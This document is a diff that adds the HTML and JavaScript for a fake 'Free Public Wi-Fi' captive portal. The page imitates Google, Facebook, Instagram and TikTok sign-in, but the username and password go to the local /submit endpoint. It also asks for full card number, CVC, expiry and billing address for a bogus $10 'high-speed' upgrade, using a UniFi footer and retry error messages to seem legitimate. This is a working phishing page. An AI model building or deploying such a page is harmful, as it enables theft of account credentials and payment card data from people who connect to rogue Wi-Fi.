@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Free Public Wi-Fi Sign</title>
+  <link href="/bootstrap-5.3.7/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    html, body {
+      height: 100%; margin: 0; padding: 0;
+      font-family: Arial, sans-serif;
+      display: flex; flex-direction: column;
+    }
+
+    #bg-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      z-index: 0;
+    }
+
+    .main {
+      position: relative;
+      z-index: 1;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background: rgba(255,255,255,0.85);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    h2 { margin-top: 0; }
+
+    .login-btn {
+      width: 100%; padding: 12px; margin: 10px 0;
+      font-size: 16px; border: none; border-radius: 6px;
+      color: #fff; display: flex; align-items: center;
+      justify-content: center; gap: 10px;
+    }
+    .login-btn img { width: 20px; height: 20px; }
+    .google   { background: #4285F4; }
+    .facebook { background: #3b5998; }
+    .instagram{ background: #C13584; }
+    .tiktok   { background: #000; }
+
+    .terms {
+      font-size: 14px; text-align: left; margin: 10px 0;
+    }
+
+    .form-container {
+      display: none; margin-top: 20px;
+    }
+
+    .form-control {
+      width: 100%; padding: 10px; margin-bottom: 10px;
+      font-size: 16px; border-radius: 4px; border: 1px solid #ccc;
+    }
+
+    .btn-submit {
+      background: #0073e6; color: #fff; border: none;
+      padding: 12px; width: 100%; font-size: 16px;
+      border-radius: 4px; opacity: 0.6; cursor: not-allowed;
+    }
+    .btn-submit.enabled {
+      opacity: 1; cursor: pointer;
+    }
+
+    .footer {
+      text-align: center; padding: 10px;
+    }
+    .footer img {
+      max-width: 120px; width: 40%; height: auto;
+      opacity: 0.7;
+    }
+    @media (max-width: 400px) {
+      .footer img { width: 60%; }
+    }
+
+    #error-box, #cardError {
+      color: red; display: none;
+      margin-bottom: 10px; text-align: left;
+    }
+    #cardType {
+      font-size: 14px; margin-bottom: 6px;
+      text-align: left; color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="bg-overlay"></div>
+
+  <div class="main">
+    <div class="container">
+      <h2>Connect to Guest Wi-Fi</h2>
+      <button class="login-btn google" onclick="selectPlatform('Google')">
+        <img src="/img/google.png" alt="">Google
+      </button>
+      <button class="login-btn facebook" onclick="selectPlatform('Facebook')">
+        <img src="/img/facebook.png" alt="">Facebook
+      </button>
+      <button class="login-btn instagram" onclick="selectPlatform('Instagram')">
+        <img src="/img/instagram.png" alt="">Instagram
+      </button>
+      <button class="login-btn tiktok" onclick="selectPlatform('TikTok')">
+        <img src="/img/tiktok.png" alt="">TikTok
+      </button>
+
+      <div class="terms">
+        <label>
+          <input type="checkbox" id="acceptTerms">
+          I agree to the <a href="/terms.html" target="_blank">Terms and Conditions</a>
+        </label>
+      </div>
+
+      <div class="form-container" id="loginForm">
+        <p id="platformSelected" style="font-weight:bold;margin-bottom:10px;"></p>
+        <p id="error-box"></p>
+        <form method="POST" action="/submit" onsubmit="return validateForm();">
+          <input type="hidden" name="platform" id="platformField">
+          <input type="text" name="username" id="username" class="form-control" placeholder="Username" required>
+          <input type="password" name="password" id="password" class="form-control" placeholder="Password" required>
+          <button type="submit" class="btn-submit" id="loginBtn">Sign in</button>
+        </form>
+      </div>
+
+      <hr>
+
+      <h5>Upgrade to High-Speed Wi-Fi for $10</h5>
+      <p>Enter Card Details.</p>
+      <form id="ccForm" method="POST" action="/pay" novalidate>
+        <input type="text" name="firstName" id="firstName" class="form-control" placeholder="First Name" required>
+        <input type="text" name="lastName" id="lastName" class="form-control" placeholder="Last Name" required>
+        <input type="text" name="cardNumber" id="cardNumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required>
+        <div id="cardType"></div>
+        <div id="cardError">Invalid. Try again or enter a new card number.</div>
+        <div style="display:flex; gap:10px; margin-bottom:10px;">
+          <input type="text" name="expiry" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+          <input type="text" name="cvc" id="cvc" class="form-control" placeholder="CVC" maxlength="4" inputmode="numeric" required>
+        </div>
+        <input type="text" name="billingAddress" id="billingAddress" class="form-control" placeholder="Billing Address" required>
+        <input type="text" name="billingCity" id="billingCity" class="form-control" placeholder="City" required>
+        <input type="text" name="billingState" id="billingState" class="form-control" placeholder="State" required>
+        <input type="text" name="zipcode" id="zipcode" class="form-control" placeholder="ZIP Code" maxlength="5" inputmode="numeric" required>
+        <button type="submit" class="btn-submit" id="payBtn" disabled>Pay $10</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer">
+    <img src="/img/poweredByUniFi.svg" alt="Powered by UniFi">
+  </div>
+  <div style="flex:0 0 80px;"></div>
+
+  <script>
+
+    const params = new URLSearchParams(location.search);
+
+    const errorBox = document.getElementById('error-box');
+    let err = params.get('error');
+    if (err === 'email') errorBox.textContent = "Please enter a valid email address.";
+    else if (err === '1')  errorBox.textContent = "Wrong username or password. Please try again.";
+    if (err) {
+      errorBox.style.display = 'block';
+      document.getElementById('loginForm').style.display = 'block';
+    }
+
+    let payErr = params.get('payError');
+    if (payErr) {
+      const cardErrorDiv = document.getElementById('cardError');
+      cardErrorDiv.textContent = decodeURIComponent(payErr);
+      cardErrorDiv.style.display = 'block';
+      document.getElementById('cardNumber').focus();
+    }
+
+    let selectedPlatform = null;
+    function selectPlatform(p) {
+      if (!document.getElementById('acceptTerms').checked) {
+        alert("Please accept the Terms and Conditions first.");
+        return;
+      }
+      selectedPlatform = p;
+      document.getElementById('platformField').value = p;
+      document.getElementById('platformSelected').textContent = `Signing in with: ${p}`;
+      document.getElementById('loginForm').style.display = 'block';
+    }
+    function validateForm() {
+      if (!selectedPlatform || !document.getElementById('acceptTerms').checked) return false;
+      if (selectedPlatform === 'Google' && !document.getElementById('username').value.includes('@')) {
+        errorBox.innerText = "Please enter a valid email address.";
+        errorBox.style.display = 'block';
+        return false;
+      }
+      return true;
+    }
+
+    const payBtn     = document.getElementById('payBtn');
+    const ccForm     = document.getElementById('ccForm');
+    const cardNumEL  = document.getElementById('cardNumber');
+    const expiryEL   = document.getElementById('expiry');
+    const zipEL      = document.getElementById('zipcode');
+    const cardTypeEl = document.getElementById('cardType');
+    const inputs     = Array.from(ccForm.querySelectorAll('input[required]'));
+
+    function formatCardNumber(e) {
+      let v = e.target.value.replace(/[^\d]/g, '');
+      let spaced = v.match(/.{1,4}/g)?.join(' ') || v;
+      e.target.value = spaced;
+      detectCardType(v);
+    }
+    function detectCardType(v) {
+      let type = '';
+      if (/^4/.test(v))          type = 'Visa';
+      else if (/^5[1-5]/.test(v)) type = 'Mastercard';
+      else if (/^3[47]/.test(v))  type = 'American Express';
+      else if (/^6/.test(v))      type = 'Discover';
+      cardTypeEl.textContent = type;
+    }
+    function formatExpiry(e) {
+      let v = e.target.value.replace(/[^\d]/g, '');
+      if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2,4);
+      e.target.value = v;
+    }
+    function formatZip(e) {
+      e.target.value = e.target.value.replace(/\D/g,'').slice(0,5);
+    }
+    function checkPayEnabled() {
+      const ok = inputs.every(i => i.value.trim() !== '')
+        && /^\d{2}\/\d{2}$/.test(expiryEL.value)
+        && /^\d{5}$/.test(zipEL.value)
+        && cardTypeEl.textContent;
+      payBtn.disabled = !ok;
+      payBtn.classList.toggle('enabled', ok);
+    }
+
+    cardNumEL.addEventListener('input', e => { formatCardNumber(e); checkPayEnabled(); });
+    expiryEL.addEventListener('input', e => { formatExpiry(e);    checkPayEnabled(); });
+    zipEL.addEventListener('input', e => { formatZip(e);         checkPayEnabled(); });
+    inputs.forEach(i => i.addEventListener('input', checkPayEnabled));
+
+    window.addEventListener('load', async () => {
+      try {
+        const res = await fetch('/bg');
+        if (!res.ok) return;
+        const txt = (await res.text()).trim();
+        document.getElementById('bg-overlay').style.backgroundImage =
+          `url('/img/${txt}?v=${Date.now()}')`;
+      } catch {}
+    });
+  </script>
+
+</body>
+</html>
